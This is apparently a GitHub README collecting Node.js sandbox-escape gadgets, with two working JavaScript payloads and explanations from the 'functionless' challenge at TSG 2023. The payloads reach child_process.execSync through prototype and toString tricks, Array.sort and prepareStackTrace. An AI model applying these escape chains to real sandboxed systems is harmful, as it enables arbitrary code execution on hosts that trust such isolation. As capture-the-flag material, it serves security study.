# Nodejs-gadget
Nodejs gadget for escaping VM, fooling syntax parser, filter evasion, RCE, ....

### My solution for `functionless` in TSG 2023
```js
toString.constructor.prototype.toString=toString.constructor.prototype.call;
a = ["process.mainModule.require\u0028'child_process'\u0029.execSync\u0028'calc.exe'\u0029","a"];
toString.constructor instanceof {[Symbol.hasInstance]:a.sort, __proto__: a};
```
`sort` take a callback as an argument, passing elements from array to the callback two by two, with this we can construct an anonymous function with the `a` as dummy parameter and inject the code's body. At somepoint the `toString` function of `toString.constructor` (a.k.a `Function`) will be called because the return value will be converted to string. The return value of `new Function` is a anonymous function, which can be invoked by overwriting `toString` to `call`. 

### From @lebr0nli, also used to solve `functionless` in TSG 2023
```js
Array.prototype.toString=Object.prototype.toString;
Array.prototype[Symbol.toStringTag]="=1];console.log(process.mainModule.constructor._load('child_process').execSync('calc.exe')+'');//";
Object.prototype.prepareStackTrace=this.constructor.constructor;
e=new Error;
x={toString:e.stack}+'';
```
Overwriting `Array.prototype.toString` to `toString` will alter the behavior of converting an Array to String, normally it's separate each member by a comma like this:
![image](https://github.com/CP04042K/Nodejs-gadget/assets/35491855/67bd8afb-e68e-4684-af69-f12ce77be926)

The normal `toString` (`Object.prototype.toString` originally a.k.a `Object.prototype.toString` == `toString`) will honor the internal slot `Symbol.toStringTag`, so by altering the value of `Symbol.toStringTag` we can force it to return the malicious code to `Function`. More precisely we can just overwrite `Array.prototype.toString` to a function that return the code directly
```js
Array.prototype.toString=function() {
  return "console.log(1)"
}
```
By looking at node internals, we can see that `prepareStackTrace` will be called if e.stack is called
![image](https://github.com/CP04042K/Nodejs-gadget/assets/35491855/3755c7c2-08b8-451b-a345-2fc82b5e3ad0)

![image](https://github.com/CP04042K/Nodejs-gadget/assets/35491855/72ea586c-ffab-4229-9dfa-390d58a25635)
`trace` is an array, we overwritten the toString of Array previously, as prepareStackTrace is now `Function`, it requires the last parameter to be a string, `trace.toString` is called and return our payload.
The constructed function is then returned as `e.stack`, so `prepareStackTrace` is the getter for `stack`. All that's left is to invoke the `e.stack`, in the context of the challenge no parentheses and backticks was allowed, so @lebr0nli abused the toString magic method to invoke `e.stack`, an beautiful chain.


